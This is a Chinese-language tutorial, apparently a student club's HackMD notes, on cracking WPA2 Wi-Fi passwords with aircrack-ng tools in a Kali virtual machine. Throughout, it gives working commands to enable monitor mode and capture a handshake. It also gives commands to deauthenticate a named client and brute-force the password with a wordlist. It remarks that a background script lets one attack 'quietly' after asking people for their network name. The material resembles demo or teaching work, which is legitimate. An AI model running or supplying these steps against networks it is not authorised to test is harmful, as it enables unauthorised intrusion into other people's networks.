# wifi: what's cracking? 文件說明

> Author: Junner
> Date: 12/05/2024
> Code: https://github.com/HackerSir/My-Waifu-Is-Not-Safe
> Description: [HackMd](https://hackmd.io/WEyS9iLSRje7boteEW4bWg)

## 大綱

> * [虛擬機設定](#For-Connection-network-configuration)
> * [用指令攻擊](#Crack-a-wifi-password-using-commands)
> * [用 Python 攻擊](#Crack-a-wifi-password-with-Python-scripts)


## 所有指令

用 root 權限執行，密碼是 `kali`。

打開 managed mode 與測試
```bash=
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
airmon-ng start wlan0
aireplay-ng --test wlan0
```

獲得目標的 MAC 與 ACK
```bash=
airodump-ng --essid alEx wlan0
airodump-ng --bssid 6A:D1:4D:7D:BE:72 -w /home/kali/Desktop/nets/test1/ wlan0
aireplay-ng -0 20 -a 6A:D1:4D:7D:BE:72 -c 50:C2:E8:0B:44:55 wlan0
```
```bash=
aircrack-ng -a2 -b 6A:D1:4D:7D:BE:72 -w /home/kali/Desktop/passwords/10-million-password-list-top-1000000.txt /home/kali/Desktop/nets/test1/*.cap
```
## 網路設定

用管理員權限運行 VMware Workstation

當 usb 裝置插入時，這個視窗將會彈出。選擇 `Connect to Virtual machine` > 選擇目標虛擬機器。

![圖片](https://hackmd.io/_uploads/HyYE0AqXyx.png)

`OK`
![圖片](https://hackmd.io/_uploads/ByDQCC5myx.png)

執行 `iwconfig`，會看到該裝置。
![圖片](https://hackmd.io/_uploads/BJgmRA971l.png)

如果你透過執行「lsusb」看到該設備名稱，但沒有看到它出現在「iwconfig」中，請重複執行上述步驟，或檢查下方的網路設定。如果執行了多次但仍看不到該設備，請重新啟動虛擬機器。

設定方式：
`Tabs` >
![圖片](https://hackmd.io/_uploads/rympRA9Xyl.png)

`Edit` > `Virtual Network Editor`
不需要 bridge
![圖片](https://hackmd.io/_uploads/r1UOR0qmyl.png)

`VM` > `Settings` > `Network Adapter`
通常 usb 裝置名稱會識別為 `VMnet0`
![圖片](https://hackmd.io/_uploads/H1qeJko7Jx.png)

這樣設定就完成了。享受你的攻擊之旅吧！

## 用指令攻擊

首先，終端機要開啟 root 權限，密碼是 `kali`。

### 打開 Monitor Mode

為了攻擊，需要為 usb 裝置打開 monitor mode

```bash=
ifconfig wlan0 down
```

運行這個後，設備將會連不到網路。
```bash=2
airmon-ng check kill
```


```bash=3
iwconfig wlan0 mode monitor
```
如果看到警告，無視他就好。
![圖片](https://hackmd.io/_uploads/S1VqYys71e.png)

```bash=4
ifconfig wlan0 up
airmon-ng start wlan0
```

為了測試 monitor mode 已經成功啟用：
```bash=6
aireplay-ng --test wlan0
```

如果看到「Injection is working!」，那就是成功了。
![圖片](https://hackmd.io/_uploads/ryDatyj71g.png)

### 關閉 monitor mode 和恢復網路連線

```bash=
airmon-ng stop wlan0
ifconfig wlan0 down
```

因為你關閉了網路管理員，要恢復的話就跑：
```bash=3
service NetworkManager restart
```

### 攻擊程序

#### 1. 獲得目標 BSSID

For ex, the target has name `alEx`.
```
airodump-ng --essid alEx wlan0
```
You'll see the `BSSID` at the top left. `Ctrl+C` to interrupt it and copy the address: `6A:D1:4D:7D:BE:72`
![圖片](https://hackmd.io/_uploads/rkRyAJjQJl.png)

#### 獲得連線到目標的裝置的 BSSID
```
airodump-ng --bssid 6A:D1:4D:7D:BE:72 -c 1 -w /home/kali/Desktop/nets/test1 wlan0
```

檔案會儲存在 `/home/kali/Desktop/nets/`，並有著 `test1` 的前綴。

等待 5 至 30 秒，`STATION` 的下方將會出現一些地址。
<!-- By the way, the channel `CH` should stay at `1`. -->
![圖片](https://hackmd.io/_uploads/S1SbGesQke.png)

#### 3. get ACK

開啟另外一個終端機，而上一個執行的指令必須還在執行中，毋須關閉。
```
aireplay-ng -0 20 -a 6A:D1:4D:7D:BE:72 -c 50:C2:E8:0B:44:55 wlan0
```

#### 4. EXPLOSION!!

ACK 的副檔名是 `.cap`。通常最新的檔案的名稱會包含著最大的數字。
![圖片](https://hackmd.io/_uploads/SJRS_ximyl.png)

然後！爆破！

```
aircrack-ng -a2 -b 6A:D1:4D:7D:BE:72 -w /home/kali/Desktop/passwords/10-million-password-list-top-1000000.txt /home/kali/Desktop/nets/test1*.cap
```

![圖片](https://hackmd.io/_uploads/SJQYkZs7Jx.png)

## 用 Python 爆破密碼。

基本上大部分情況都會被處理，如果還是爆開就...用上面的指令打，因為用上面的指令還比較有展示性一點，但如果用 script 就能悄悄的攻擊，兩種不一樣的方式。

所以如果可以的話，先問他們 wifi 名稱，放到 script 裡面讓他背景執行。如果真的不行的話再手動打，現場展示。


基本上會改的部分就是 `target`、`file_path`、`passwordSet_path`。

主要：
* `target`：要攻擊的目標名稱。

其他還有像是：
* `file_path`：要儲存的檔案**路徑**。
* `passwordSet_path`：密碼集文字檔的所在地。

![圖片](https://hackmd.io/_uploads/BJkkIEy4Jg.png)

